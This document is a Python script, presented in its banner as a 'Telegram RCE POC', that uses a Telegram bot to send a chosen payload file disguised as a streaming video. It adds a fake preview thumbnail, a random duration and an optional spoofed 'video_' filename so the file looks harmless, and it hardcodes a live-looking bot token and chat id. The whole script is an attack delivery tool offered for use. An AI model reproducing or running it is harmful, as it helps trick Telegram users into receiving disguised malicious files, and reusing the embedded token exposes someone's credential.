import telebot
from random import randint
from colorama import Fore, Style, init
from os import path, rename
from datetime import datetime

init(convert=True)

print(Fore.GREEN + """

████████╗ ██████╗ ███╗   ███╗███████╗██████╗ ██╗ █████╗  ██████╗ ██████╗  █████╗ ██╗   ██╗
╚══██╔══╝██╔════╝ ████╗ ████║██╔════╝██╔══██╗██║██╔══██╗██╔═████╗██╔══██╗██╔══██╗╚██╗ ██╔╝
   ██║   ██║  ███╗██╔████╔██║█████╗  ██║  ██║██║███████║██║██╔██║██║  ██║███████║ ╚████╔╝ 
   ██║   ██║   ██║██║╚██╔╝██║██╔══╝  ██║  ██║██║██╔══██║████╔╝██║██║  ██║██╔══██║  ╚██╔╝  
   ██║   ╚██████╔╝██║ ╚═╝ ██║███████╗██████╔╝██║██║  ██║╚██████╔╝██████╔╝██║  ██║   ██║   
   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
Telegram RCE POC | Provided by @Linuxndroid
""" + Fore.RESET)

bot = telebot.TeleBot("7247740671:AAGuNti00Elz2pPSdj7MWOxPTr3wb2U9wd8")
your_id = "5050605444"

def rsize(num):
    for unit in ("", "K", "M", "G", "T"):
        if abs(num) < 1024.0:
            return f"{num:3.1f}{unit}B"
        num /= 1024.0
    return f"{num:.1f}YB"

def send_rce(chat_id : int, payload : str, preview : str, duration : int):
    with open(payload, "rb") as video:
        with open(preview, "rb") as preview:
            bot.send_video(chat_id, video=video, thumbnail=preview, supports_streaming=True, duration=duration, height=720, width=1080)

def gen_str(len):
    result = ""
    for i in range(0, len):
        result += str(randint(0, 9))
    return result

def main():
    filename = input("Payload file > ")
    preview = input("Video preview > ")
    spoof_name = input("Spoof name (y/n) > ") == "y"
    duration = randint(120, 580)
    
    try:
        readable_size = rsize(path.getsize(filename))
        if spoof_name:
            generated =  "video_" + datetime.now().strftime("%Y-%m-%d") + "_" + gen_str(12) + path.splitext(filename)[1]
            rename(filename, generated)
            try:
                send_rce(your_id, generated, preview, duration)
            except Exception as e:
                raise e
            finally:
                rename(generated, filename)
        else:
            send_rce(your_id, filename, preview, duration)
        print(Fore.GREEN + f"[i] Payload sent successfully to {your_id} ({readable_size})" + Fore.RESET)
    except Exception as e:
        print(Fore.RED + f"[e] Failed to execute: {e}" + Fore.RESET)
        
    input("Press any key to exit...")
    
if __name__ == "__main__":
    main()
